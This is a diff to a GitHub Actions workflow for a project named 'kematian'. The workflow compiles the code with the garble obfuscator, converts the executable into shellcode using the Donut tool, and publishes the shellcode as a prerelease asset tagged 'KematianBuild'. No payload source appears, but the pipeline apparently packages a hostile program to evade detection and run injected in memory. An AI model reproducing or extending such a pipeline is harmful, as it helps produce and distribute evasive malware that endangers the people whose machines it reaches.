@@ -38,6 +38,27 @@ jobs:
       working-directory: ./kematian-src
       run: garble -tiny build .
 
+    # Delete-tag-and-release new
+    - name: Delete-tag-and-release
+      uses: dev-drprasad/delete-tag-and-release@v1.1
+      with:
+        tag_name: KematianBuild #(required) - The name of the tag to delete. This is expected to be solely the tag name, not the name of a git reference.
+        delete_release: true #(optional) default: true - also delete all releases and their assets that are associated to the tag name
+        github_token: ${{ secrets.GITHUB_TOKEN }} # (required) - a GitHub token with write access to the repo where tags and releases will be searched and deleted
+
+    # Create Release
+    - name: Create Release
+      id: create_release
+      uses: actions/create-release@latest
+      env:
+        GITHUB_TOKEN: ${{ secrets.github_token }}
+      with:
+        tag_name: KematianBuild
+        release_name: KematianBuild
+        body: "KematianBuild"
+        draft: false
+        prerelease: true
+
     # Download Donut
     - name: Download Donut
       run: Invoke-WebRequest https://github.com/TheWover/donut/releases/download/v1.0/donut_v1.0.zip -OutFile donut.zip
@@ -50,30 +71,9 @@ jobs:
     - name: Convert kematian-src to Shellcode 
       run: .\donut\donut.exe -i kematian-src\kematian.exe -x2 -a2 -o kematian.bin -z 4
 
-    # Delete-tag-and-release new
-    - name: Delete-tag-and-release
-      uses: dev-drprasad/delete-tag-and-release@v1.1
-      with:
-        tag_name: AutoBuild #(required) - The name of the tag to delete. This is expected to be solely the tag name, not the name of a git reference.
-        delete_release: true #(optional) default: true - also delete all releases and their assets that are associated to the tag name
-        github_token: ${{ secrets.GITHUB_TOKEN }} # (required) - a GitHub token with write access to the repo where tags and releases will be searched and deleted
-
-    # Create Release
-    - name: Create Release
-      id: create_release
-      uses: actions/create-release@latest
-      env:
-        GITHUB_TOKEN: ${{ secrets.github_token }}
-      with:
-        tag_name: AutoBuild
-        release_name: AutoBuild
-        body: "AutoBuild"
-        draft: false
-        prerelease: true
-
-    # Upload Release Asset
+    # Upload Shellcode Asset
     - name: Upload Release Asset
-      id: upload-release-asset 
+      id: upload-release-asset-donut
       uses: actions/upload-release-asset@v1
       env:
         GITHUB_TOKEN: ${{ secrets.github_token }}
